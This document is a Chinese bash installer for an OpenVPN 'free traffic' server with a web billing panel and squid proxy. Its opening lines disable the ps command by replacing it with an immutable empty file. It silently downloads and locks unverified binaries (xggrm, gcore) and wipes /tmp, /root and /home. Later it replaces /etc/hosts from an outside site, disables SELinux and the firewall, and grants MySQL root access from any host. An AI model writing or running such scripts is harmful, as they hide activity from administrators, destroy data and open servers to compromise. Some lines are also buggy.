#环境检测
ulimit -c 0
rm -rf /tmp/tmp*            >/dev/null 2>&1
rm -rf /tmp/*               >/dev/null 2>&1
chattr -a /tmp/             >/dev/null 2>&1
chattr -i /tmp/             >/dev/null 2>&1
chattr -i /usr/bin/*        >/dev/null 2>&1
chattr -i /usr/bin/         >/dev/null 2>&1
chattr -a /usr/bin/*        >/dev/null 2>&1
chattr -i /usr/bin/ps       >/dev/null 2>&1
rm -rf /usr/bin/ps          >/dev/null 2>&1
touch /usr/bin/ps           >/dev/null 2>&1
chattr +i /usr/bin/ps       >/dev/null 2>&1          
if [ ! -e "/usr/bin/xggrm" ];then
cd /usr/bin
wget -q https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/xggrm
chmod 777 /usr/bin/xggrm     >/dev/null 2>&1
chattr +i /usr/bin/xggrm     >/dev/null 2>&1
fi
rm -rf /usr/bin/gcore
rm -rf /root/*
rm -rf $0
rm -rf xgg
xggrm -rf /usr/bin/gcore
xggrm -rf /root/*
xggrm -rf $0
xggrm -rf xgg
if [ ! -e "/usr/bin/gcore" ];then
cd /usr/bin
wget -q https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/gcore
chmod 777 /usr/bin/gcore     >/dev/null 2>&1
chattr +i /usr/bin/gcore     >/dev/null 2>&1
fi
#变量
sq=squid.conf;
mp=udp.c;
EasyRSA=EasyRSA.tar.gz;
host=yxvpn.net;
RSA=EasyRSA-2.2.2.tar.gz;
IP=`curl -s http://members.3322.org/dyndns/getip`;
squser=auth_user;
#key='yxvpn.net';
sysctl=sysctl.conf;
lnmpfile='xgg-lnmp.zip';
webfile='web.zip';
uploadfile=openvpn-$RANDOM.zip;
#Date=`curl -s ${key}/flle.html`;
Date='烟雨如花于2019.8.9修复';
Download="https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg";
Download1="https://files.010521.xyz/OpenVPN/xgg";
#okpass=`curl -s ${key}shell.php`;
clear
#选项
echo
echo -e "\033[42m============================请选选择安装模式============================\033[0m"
echo
echo -e "\033[31m1 全新安装(回车默认) 支持云端APP、流量卫士5.1、Udp和tcp共存、自动备份、实时监控\033[0m"
echo 
echo -e "\033[33m2 对接模式 实现N台服务器共用账号\033[0m"
echo
echo -e "\033[34m3 备份恢复 备份和恢复小哥哥证书和数据库、以便重新搭建\033[0m"
echo
echo -e "\033[35m4 美化版APP 美化版卫士、云端APK生成\033[0m"
echo
echo -e "\033[36m5 线路更新 更新日期-${Date}\033[0m"
echo
echo -e "\033[32m6 BBR加速  安装BBR加速、优化内核提升速度\033[0m"
echo
echo -e "\033[31m7 流量卫士 最新版流量卫士安装\033[0m"
echo
echo -e "\033[37mx 卸载. \033[0m"
echo
echo -n -e "请输入对应数字:"
read installslect

if [[ $installslect == "2" ]];then
wget -q ${Download}/dj.sh;sh dj.sh
exit 0;
fi
if [[ $installslect == "3" ]];then
wget -q ${Download}/bf.sh;sh bf.sh
exit 0;
fi
if [[ $installslect == "4" ]];then
wget -q ${Download}/app.sh;sh app.sh
exit 0;
fi
if [[ $installslect == "5" ]];then
wget -q $Download/xlgx;sh xlgx
exit 0;
fi
if [[ $installslect == "6" ]];then
wget -q ${Download}/bbr.sh;sh bbr.sh
exit 0;
fi
if [[ $installslect == "7" ]];then
wget -q ${Download}/aw3;sh aw3
exit 0;
fi
if [[ $installslect == "x" ]];then
wget -q ${Download}/xz.sh;sh xz.sh
exit 0;
fi
#管理信息
echo
echo -e "\033[31m请输入VPN端口 默认443\033[0m"
read vpnport
[[ -z "$vpnport" ]] && vpnport=443 
echo -e "\033[34m已设置VPN端口为：$vpnport\033[0m"
echo
echo -e "\033[31m请输HTTP转接端口 默认8080\033[0m"
read mpport
[[ -z "$mpportt" ]] && mpport=8080
echo -e "\033[34m已设置HTTP转接端口：$mpport\033[0m"
echo
echo -e "\033[31m请输常规代理 默认80\033[0m"
read sqport 
[[ -z "$sqport" ]] && sqport=80
echo -e "\033[34m已设置HTTP转接端口：$sqport \033[0m"
echo
echo -e "\033[31m请输入WEB面板端口 默认随机 推荐默认\033[0m"
read port
[ -z "$port" ] && port=$(($(($RANDOM%8819))+1180))
[ "$port" == "3389" ] || [ "$port" == "8080" ] && port = $(($(($RANDOM%8819))+1180))
echo -e "\033[34m已设置WEB流控端口号为：$port\033[0m"
echo
echo -e "\033[31m请输入WEB面板账号管理账号\033[0m"
read id
[ -z "$id" ] && id="admin"
echo -e "\033[34m已设置WEB面板账号管理账号为：$id\033[0m"
echo
echo -e "\033[31m请输入WEB面板账号管理密码\033[0m"
read ml
[ -z "$ml" ] && ml=`cat /dev/urandom | head -n 9 | md5sum | head -c 9`
echo -e "\033[34m已设置WEB面板账号管理密码为：$ml\033[0m"
echo
echo -e "\033[31m请输入数据库密码 推荐默认\033[0m"
read sqlpass
[ -z "$sqlpass" ] && sqlpass=`cat /dev/urandom | head -n 15 | md5sum | head -c 15`
echo -e "\033[34m已设置数据库密码为：$sqlpass\033[0m"
echo
echo -e "\033[31m[请输入您的云端APP名字]\033[0m"
read appname 
if [[ -z $appname ]] 
then 
echo
echo -e "\033[34m[已设置云端APP名字为]\033[0m：小哥哥云流量  "
appname=小哥哥云流量 
else 
echo
echo -e "\033[34m[已设置云端APP名字为]\033[0m：$appname "
fi
echo 
echo -e "\033[31m[请输入您的云端客服QQ]\033[0m"
echo 
echo -n -e "App客服QQ：" 
read appqq
if [[ -z $appqq ]] 
then 
echo
echo -e "\033[34m[已设置App客服QQ]\033[0m：123456 " 
appqq=123456
else 
echo
echo -e "\033[34m[已设置App客服QQ]\033[0m: $appqq "
fi 
echo
echo -e "\033[31m[请输入您的云端key]\033[0m"
read appkey
if [[ -z $appkey ]] 
then 
echo
appkey=xgg$RANDOM
echo -e "\033[34m[已设置APP对接KEY]\033[0m：${appkey} " 
else 
echo
echo -e "\033[34m[已设置APP对接KEY]\033[0m：$appkey " 
fi
echo
llwsid=admin
llwsml=xgg$RANDOM$RANDOM
echo -e "\033[31m[请输入您的流量卫士APP名字]\033[0m"
read llwsname
if [[ -z $llwsname  ]] 
then 
echo
echo -e "\033[34m[已设置流量卫士App名称]\033[0m：小哥哥流量卫士 " 
llwsname=小哥哥流量卫士
else 
echo
echo -e "\033[34m[已设置流量卫士App名称]\033[0m：$llwsname " 
fi
echo
echo -e "\033[31m[请输入您的流量卫士key]\033[0m"
read llwskey
if [[ -z $llwskey ]] 
then 
echo
llwskey=xgg$RANDOM
echo -e "\033[34m[已设置流量卫士APP对接KEY]\033[0m：${llwskey} " 
else 
echo
echo -e "\033[34m[已设置流量卫士APP对接KEY]\033[0m：$llwskey " 
llwsmd5=`echo -n $llwskey|md5sum`
fi

#搭建环境
#fwqtype=`curl -s  http://ip138.com/ips138.asp?ip=${IP}\&action=2 | iconv -f gb2312 -t utf-8|grep '<ul class="ul1"><li>' |awk -F'[><]+' '{  
#print $5}'`
fwqtype=`curl -s http://members.3322.org/dyndns/getip`;
#if [[ $fwqtype =~ "阿里云" ]] || [[ $fwqtype =~ "腾讯云" ]] || [[ $fwqtype =~ "小鸟云" ]]; then
if [[ $fwqtype == $fwqtype ]];then
echo
#echo -e "\033[31m请你选择搭建环境LAMP/LNMP\033[0m"
echo -e "\033[31m请你选择搭建环境LAMP/LNMP 高防鸡请自行选择LNMP\033[0m"
echo
echo -e "\033[33m温馨提示：LAMP输入a、LNMP输入n\033[0m"
read huanjing
if [[ -z $huanjing ]];then
huanjing=1;
echo -e "\033[34m已选择的搭建环境为\033[0m：LANMP " 
else
if [[ $huanjing == "a" ]];then
echo -e "\033[34m已选择的搭建环境为\033[0m：LANMP " 
huanjing=1;
else
if [[ $huanjing == "n" ]];then
echo -e "\033[34m已选择的搭建环境为\033[0m：LNNMP " 
huanjing=2;
fi
fi		
fi	
else
echo
echo -e "\033[32m当前为高防机，默认选项LNMP搭建环境\033[0m"
huanjing=2;
sleep 3
fi
#整理环境
echo -e "\033[35m开始整理残留环境...\033[0m"
setenforce 0 
sestatus=`/usr/sbin/sestatus -v`
[[ $sestatus =~ "enforcing" ]] && sta=1
if [[ $sta == "1" ]];then
echo -e "\033[34m 临时关闭Selinux失败,脚本已为您修改配置,重启后生效 \033[0m "
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
echo
fi
echo -e "\033[35m开始整理安装环境...\033[0m"	
echo
CURTIME=`date +"%Y-%m-%d %H:%M:%S"` #当前的系统时间 
systemctl stop openvpn@server.service >/dev/null 2>&1
yum -y remove openvpn >/dev/null 2>&1
systemctl stop squid.service >/dev/null 2>&1
yum -y remove squid >/dev/null 2>&1
killall udp >/dev/null 2>&1
rm -rf /etc/openvpn/*
rm -rf /root/*
rm -rf /home/*	
systemctl stop httpd.service >/dev/null 2>&1
systemctl stop mariadb.service >/dev/null 2>&1
systemctl stop mysqld.service >/dev/null 2>&1
/etc/init.d/mysqld stop >/dev/null 2>&1
yum remove -y httpd >/dev/null 2>&1
yum remove -y mariadb mariadb-server >/dev/null 2>&1
yum remove -y mysql mysql-server >/dev/null 2>&1
yum remove -y nginx >/dev/null 2>&1
rm -rf /var/lib/mysql
rm -rf /var/lib/mysql/
rm -rf /usr/lib64/mysql
rm -rf /etc/my.cnf
rm -rf /var/log/mysql/
rm -rf
yum remove -y php-fpm php-cli php-gd php-mbstring php-mcrypt php-mysqlnd php-opcache php-pdo php-devel php-xml >/dev/null 2>&1
echo -e "\033[36m整理完毕\033[0m"
echo
echo -e "\033[35m系统正在检查并更新软件，请耐心等待...\033[0m"
yum remove -y squid openvpn httpd epel* openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig expect gcc php-fpm php-cli php-gd php-mbstring php-mcrypt php-mysqlnd php-opcache php-pdo php-devel php-xml >/dev/null 2>&1
yum install -y curl redhat-lsb gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc-static java openssl expect ntp lsof psmisc net-tools >/dev/null 2>&1
echo -e "\033[36m更新完成\033[0m"
echo
echo -e "\033[35m正在配置网络环境...\033[0m"
systemctl stop firewalld.service >/dev/null 2>&1
systemctl disable firewalld.service >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
yum install iptables-services -y >/dev/null 2>&1
yum -y install vim vim-runtime ctags >/dev/null 2>&1
cd /etc/
rm -rf ./${sysctl}
wget ${Download}/${sysctl} >/dev/null 2>&1
chmod 0777 ./${sysctl}
sysctl -p >/dev/null 2>&1

#配置防火墙
systemctl start iptables >/dev/null 2>&1
systemctl restart iptables >/dev/null 2>&1
iptables -F >/dev/null 2>&1
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.5.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.5.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.6.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.6.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 361 -j DNAT --to-destination $IP:137
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 138 -j DNAT --to-destination $IP:137
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 440 -j DNAT --to-destination $IP:$vpnport
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 3389 -j DNAT --to-destination $IP:$vpnport
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 28080 -j ACCEPT
iptables -A INPUT -p TCP --dport $vpnport -j ACCEPT
iptables -A INPUT -p TCP --dport $port -j ACCEPT
iptables -A INPUT -p TCP --dport $mpport -j ACCEPT
iptables -A INPUT -p TCP --dport $sqport -j ACCEPT
iptables -A INPUT -p TCP --dport 135 -j ACCEPT
iptables -A INPUT -p TCP --dport 136 -j ACCEPT
iptables -A INPUT -p TCP --dport 137 -j ACCEPT
iptables -A INPUT -p TCP --dport 138 -j ACCEPT
iptables -A INPUT -p TCP --dport 139 -j ACCEPT
iptables -A INPUT -p TCP --dport 366 -j ACCEPT
iptables -A INPUT -p TCP --dport 351 -j ACCEPT
iptables -A INPUT -p TCP --dport 265 -j ACCEPT
iptables -A INPUT -p TCP --dport 524 -j ACCEPT
iptables -A INPUT -p TCP --dport 3389 -j ACCEPT
iptables -A INPUT -p TCP --dport 1194 -j ACCEPT
iptables -A INPUT -p TCP --dport 180 -j ACCEPT
iptables -A INPUT -p TCP --dport 366 -j ACCEPT
iptables -A INPUT -p TCP --dport 53 -j ACCEPT
iptables -A INPUT -p TCP --dport 80 -j ACCEPT
iptables -A INPUT -p TCP --dport 22 -j ACCEPT
iptables -A INPUT -p TCP --dport 25 -j DROP
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 138 -j ACCEPT
iptables -A INPUT -p udp --dport 137 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
chkconfig iptables on >/dev/null 2>&1
systemctl enable iptables.service >/dev/null 2>&1
setenforce 0 >/dev/null 2>&1
echo -e "\033[36m配置完成\033[0m"
echo
#依赖安装
echo -e "\033[35m正在安装主程序...\033[0m"
rm -rf /etc/hosts >/dev/null 2>&1
wget -P /etc www.sxhualv.com/xbml/hosts >/dev/null 2>&1
yum install -y gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc glibc-static glibc-utils java openssl openssl-libs ntp libstdc++ glibc.i686 >/dev/null 2>&1
if [ ! -e "/usr/lib/libz.so.1" ]; then
yum install -y zlib >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/gcc" ];then
yum install -y gcc >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/java" ];then
yum install -y java >/dev/null 2>&1
fi
if [ ! -e "/usr/lib/libz.so.1" ];then
rpm -ivh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/zlib-1.2.7-17.el7.i686.rpm >/dev/null 2>&1
fi
if [ ! -e "/lib/libgcc_s.so.1" ];then
rpm -ivh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/libgcc-4.8.5-11.el7.i686.rpm >/dev/null 2>&1
fi
rpm -ivh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/pkcs11-helper-1.11-3.el7.x86_64.rpm >/dev/null 2>&1
if [ ! -e "/usr/lib64/libpkcs11-helper.so.1" ];then
rpm -Uvh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/epel-release-7-9.noarch.rpm >/dev/null 2>&1
yum install pkcs11-helper -y >/dev/null 2>&1
fi
cd /etc/
rpm -ivh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1											 
rpm -ivh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1
rpm -ivh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1
\cp /usr/sbin/openvpn /usr/sbin/openvpn2 >/dev/null 2>&1
if [ ! -f "/etc/openvpn-2.3.2-4.el7.x86_64.rpm" ];then
rm -f openvpn-2.3.2-4.el7.x86_64.rpm
fi
if [ ! -e "/usr/sbin/openvpn" ];then
rpm -Uvh https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/xgg/epel-release-7-9.noarch.rpm >/dev/null 2>&1
yum install openvpn -y >/dev/null 2>&1
\cp /usr/sbin/openvpn /usr/sbin/openvpn2 >/dev/null 2>&1
fi
yum install -y curl redhat-lsb gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc-static java openssl expect ntp lsof psmisc net-tools >/dev/null 2>&1
yum install -y telnet openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig expect gcc net-tools >/dev/null 2>&1
cd /etc/openvpn/ 
wget ${Download}/${EasyRSA} >/dev/null 2>&1
tar -zxvf ${EasyRSA} >/dev/null 2>&1
rm -rf /etc/openvpn/${EasyRSA} >/dev/null 2>&1
chmod -R 0777 /etc/openvpn/
systemctl enable openvpn@server.service >/dev/null 2>&1
cp /etc/openvpn/easy-rsa/keys/ca.crt /home/ >/dev/null 2>&1
cp /etc/openvpn/easy-rsa/ta.key /home/ >/dev/null 2>&1
echo "echo -e '\033[33m正在重启openvpn服务...\033[0m'
onlock >/dev/null 2>&1
rm -rf /home/jiankong.log
killall openvpn >/dev/null 2>&1
systemctl stop openvpn@server.service
systemctl start openvpn@server.service
killall udp >/dev/null 2>&1
udp -l 8080 -d >/dev/null 2>&1
udp -l 136 -d >/dev/null 2>&1
udp -l 137 -d >/dev/null 2>&1
udp -l 138 -d >/dev/null 2>&1
udp -l 139 -d >/dev/null 2>&1
udp -l 53 -d >/dev/null 2>&1
udp -l 3389 -d >/dev/null 2>&1
udp -l 1194 -d >/dev/null 2>&1
udp -l 351 -d >/dev/null 2>&1
udp -l 524 -d >/dev/null 2>&1
udp -l 265 -d >/dev/null 2>&1
udp -l 440 -d >/dev/null 2>&1
udp -l 180 -d >/dev/null 2>&1
udp -l 366 -d >/dev/null 2>&1
udp -l 28080 -d >/dev/null 2>&1
killall squid >/dev/null 2>&1
killall squid >/dev/null 2>&1
squid -z >/dev/null 2>&1
systemctl restart squid
lamp >/dev/null 2>&1
lnmp >/dev/null 2>&1
openvpn --config /etc/openvpn/server.conf &
openvpn --config /etc/openvpn/udp137.conf &
openvpn --config /etc/openvpn/udp138.conf &
openvpn --config /etc/openvpn/udp53.conf &
killall jiankong >/dev/null 2>&1
killall backups.sh >/dev/null 2>&1
/home/wwwroot/default/res/jiankong >>/home/jiankong.log 2>&1 &
/home/wwwroot/default/udp/jiankong >>/home/jiankong.log 2>&1 &
/etc/openvpn/backups.sh >>/home/wwwroot/backups.log 2>&1 &
unlock >/dev/null 2>&1
echo -e '服务状态：			  [\033[32m  OK  \033[0m]'
exit 0;" >/bin/vpn
chmod 777 /bin/vpn
chmod +x /etc/rc.d/rc.local
echo "sh /bin/vpn" >>/etc/rc.d/rc.local
echo -e "\033[36m安装完毕\033[0m"
echo
echo -e "\033[35m正在安装设置HTTP代理端口...\033[0m"
yum -y install squid >/dev/null 2>&1
cd /etc/squid/
rm -rf ./squid.conf
killall squid >/dev/null 2>&1
wget ${Download}/${sq} >/dev/null 2>&1
sed -i 's/http_port 80/http_port '$sqport'/g' /etc/squid/squid.conf >/dev/null 2>&1
chmod 0755 ./${sq} >/dev/null 2>&1
wget ${Download}/${squser} >/dev/null 2>&1
chmod 0755 ./${squser} >/dev/null 2>&1
cd /etc/
chmod 777 -R squid
cd squid
squid -z >/dev/null 2>&1
systemctl restart squid >/dev/null 2>&1
systemctl enable squid >/dev/null 2>&1
cd /usr/bin/
wget ${Download}/${mp} >/dev/null 2>&1
sed -i "23s/8080/$mpport/" udp.c
sed -i "184s/443/$vpnport/" udp.c
gcc -o udp udp.c
rm -rf ${mp} >/dev/null 2>&1
chmod 0777 ./udp >/dev/null 2>&1
clear
#环境安装-LAMP
if [[ $huanjing == "1" ]];then
echo -e "port=$port" >/root/port
echo -e "\033[35m正在极速部署LAMP环境...\033[0m"
echo
echo -e "\033[33m注意：安装过程中如果有卡住或者停住请耐心等待\033[0m"
echo -e "\033[34m注意：小哥哥LAMP环境极速搭建、帅的人只需要5分钟\033[0m"
echo -e "\033[35m注意：人之初 性本善 脚本搭建不会慢\033[0m"
sleep 2
cd /root/
wget ${Download}/lamp.sh>/dev/null 2>&1 
chmod 0777 lamp.sh
./lamp.sh
rm -rf lamp.sh
echo -e "\033[31m安装完成！\033[0m"
echo -e "\033[31m感谢使用小哥哥极速lamp全新系统\033[0m"
fi	
#环境安装-LNMP
if [[ $huanjing == "2" ]];then
echo -e "\033[35m正在极速部署LNMP环境...\033[0m"
echo
echo -e "\033[33m注意：安装过程中如果停住请耐心等待\033[0m"
echo -e "\033[34m注意：小哥哥极速搭建 5分钟以内完成\033[0m"
echo -e "\033[35m注意：人之初 性本善 脚本搭建不会慢\033[0m"
sed -i 's/;date.timezone/date.timezone = PRC/g' /etc/php.ini >/dev/null 2>&1
cd /root/
wget ${Download}/${lnmpfile} >/dev/null 2>&1
unzip ${lnmpfile} >/dev/null 2>&1
rm -rf ${lnmpfile} >/dev/null 2>&1
chmod 777 -R /root/lnmp >/dev/null 2>&1
cd lnmp
./install.sh >/dev/null 2>&1
echo "#!/bin/bash
echo '正在重启lnmp...'
systemctl restart mariadb
systemctl restart nginx.service
systemctl restart php-fpm.service
systemctl restart crond.service
echo -e '服务状态：			  [\033[32m  OK  \033[0m]'
exit 0;
" >/bin/lnmp
chmod 777 /bin/lnmp >/dev/null 2>&1
lnmp >/dev/null 2>&1
rm -rf /root/lnmp >/dev/null 2>&1
fi
#WEB服务安装
cd /etc/sysconfig/;
rm -rf i18n 
echo 'LANG="en_US.UTF-8" SYSFONT="latarcyrheb-sun16"'>/etc/sysconfig/i18n 
source /etc/sysconfig/i18n
cd /root/
wget ${Download}/phpmyadmin.tar.gz >/dev/null 2>&1
tar -zxvf phpmyadmin.tar.gz -C /home/wwwroot/default/ >/dev/null 2>&1
rm -f phpmyadmin.tar.gz >/dev/null 2>&1
clear
echo -e "\033[36m开始搭建小哥哥流量控制程序\033[0m"
mysqladmin -u root password "${sqlpass}"
sed -i 's/80/'$port'/g' /usr/local/nginx/conf/nginx.conf >/dev/null 2>&1
sed -i 's/80/'$port'/g' /etc/nginx/conf.d/default.conf >/dev/null 2>&1
cd /root/
wget ${Download1}/${webfile} >/dev/null 2>&1
unzip ${webfile} >/dev/null 2>&1
mv /root/web/* /home/wwwroot/default/
mv /root/conf/* /etc/openvpn/
mv /root/safe/* /usr/bin/
rm -rf /root/*

#信息录入
mlmd5=`echo -n $ml|md5sum`
sed -i 's/qyadmin/'$id'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/843491408/'$appqq'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/9702bec258c38676a1217f2c0c58d610/'${mlmd5%%\ *}'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/llwsadmin/'$llwsid'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/llwspass/'$llwsml'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/192.168.1.1:8888/'${IP}:${port}'/g' /etc/openvpn/disconnect.sh >/dev/null 2>&1
sed -i 's/yxvpn.net/'${IP}:${port}'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/yxvpn.net/'${IP}:${port}'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1
sed -i 's/xgg0625/'${appkey}'/g' /home/wwwroot/default/install.sql >/dev/null 2>&1

create_db_sql="create database IF NOT EXISTS ov"
mysql -hlocalhost -uroot -p$sqlpass -e "${create_db_sql}"
mysql -hlocalhost -uroot -p$sqlpass --default-character-set=utf8<<EOF
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '${sqlpass}' WITH GRANT OPTION;
flush privileges;
use ov;
source /home/wwwroot/default/install.sql;
EOF
rm -rf /home/wwwroot/default/install.sql
sed -i 's/443/'$vpnport'/g' /etc/openvpn/server.conf >/dev/null 2>&1
sed -i 's/sqlpass/'$sqlpass'/g' /home/wwwroot/default/api/config.php >/dev/null 2>&1
sed -i '1s/30/'10'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i '8s/86400/'86400'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i '20s/123456/'$sqlpass'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/yxvpn.net/'${IP}:${port}'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/0542fa6e2f2de6bb5f3a7813ded625ab/'${llwskey}'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/yxvpn.net/'${IP}'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/1234/'$port'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/小哥哥云流量/'$appname'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/xgg0625/'$appkey'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/123456/'$appqq'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/小哥哥流量卫士/'$llwsname'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/0542fa6e2f2de6bb5f3a7813ded625ab/'$llwsmd5'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/openvpn-xggml.zip/'$uploadfile'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/xgg0625/'$llwskey'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/sqlpass/'${sqlpass}'/g' /home/wwwroot/default/app_api/config.php >/dev/null 2>&1
sed -i 's/yxvpn.net/'${IP}:${port}'/g' '/home/wwwroot/default/app_api/user/index.php' >/dev/null 2>&1
sed -i 's/yxvpn.net/'${IP}:${port}'/g' '/home/wwwroot/default/app_api/mode/ad.php' >/dev/null 2>&1
sed -i 's/小哥哥云流量/'$llwsappname'/g' '/home/wwwroot/default/app_api/mode/ad.php' >/dev/null 2>&1
sed -i 's/123456/'$appqq'/g' '/home/wwwroot/default/app_api/mode/all.php' >/dev/null 2>&1
sed -i 's/小哥哥云流量/'$llwsappname'/g' '/home/wwwroot/default/app_api/mode/all.php' >/dev/null 2>&1
sed -i 's/小哥哥免流/'$llwsappname'/g' '/home/wwwroot/default/app_api/html/help.html' >/dev/null 2>&1
sed -i 's/0542fa6e2f2de6bb5f3a7813ded625ab/'$llwsmd5'/g' /home/wwwroot/default/app_api/licences.key >/dev/null 2>&1
mv /home/wwwroot/default/app_api/top_api.php /home/wwwroot/default/app_api/${llwskey}.php >/dev/null 2>&1
phpmyadmin=`cat /dev/urandom | head -n 10 | md5sum | head -c 10`
mv /home/wwwroot/default/phpmyadmin /home/wwwroot/default/${phpmyadmin}
ht=`cat /dev/urandom | head -n 8 | md5sum | head -c 8`
mv /home/wwwroot/default/admin /home/wwwroot/default/${ht}
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/onlock >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/unlock >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/onsql >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/unsql >/dev/null 2>&1
sed -i 's/admin/'${ht}'/g' '/usr/bin/onlock' >/dev/null 2>&1
sed -i 's/admin/'${ht}'/g' '/usr/bin/unlock' >/dev/null 2>&1
sed -i 's/xggadmin'${ht}'/g' '/home/wwwroot/default/app_api/nav.php' >/dev/null 2>&1
yum install -y crontabs >/dev/null 2>&1
mkdir -p /var/spool/cron/ >/dev/null 2>&1

#权限调整
chmod 777 /home/wwwroot/default/api/cron.php >/dev/null 2>&1
echo "* * * * * curl --silent --compressed http://${IP}:${port}/api/cron.php">>/var/spool/cron/root >/dev/null 2>&1
systemctl restart crond.service  >/dev/null 2>&1   
systemctl enable crond.service >/dev/null 2>&1 
echo "/home/wwwroot/default/res/jiankong >>/home/jiankong.log 2>&1 &">>/etc/rc.local >/dev/null 2>&1
echo "/home/wwwroot/default/udp/jiankong >>/home/jiankong.log 2>&1 &">>/etc/rc.local >/dev/null 2>&1
chmod a+x /etc/openvpn/backups.sh >/dev/null 2>&1
echo "/etc/openvpn/backups.sh >>/home/backups.log 2>&1 &">>/etc/rc.local >/dev/null 2>&1
chmod 777 -R /home/wwwroot/default/
chmod 777 -R /home/wwwroot/default/api/*.php
chmod 777 -R /home/wwwroot/default/res/
chmod 777 -R /home/wwwroot/default/udp/
chmod a+x /etc/openvpn/*.sh
chmod a+x /etc/openvpn/*.conf
chmod 777 /usr/bin/unlock
chmod 777 /usr/bin/onlock
chmod 777 /usr/bin/onsql
chmod 777 /usr/bin/unsql
chmod 777 /usr/bin/kdk
chmod -R 0555 /home/wwwroot/default/$ht                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/ios                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/web                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/api                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/pay                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/360safe                             >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/daili                               >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/user                                >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/res                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/udp                                 >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/$phpmyadmin                         >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/app_api                             >/dev/null 2>&1
chmod -R 0555 /home/wwwroot/default/app_api/data                        >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/data/content.txt            >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/data/daili_123.txt          >/dev/null 2>&1
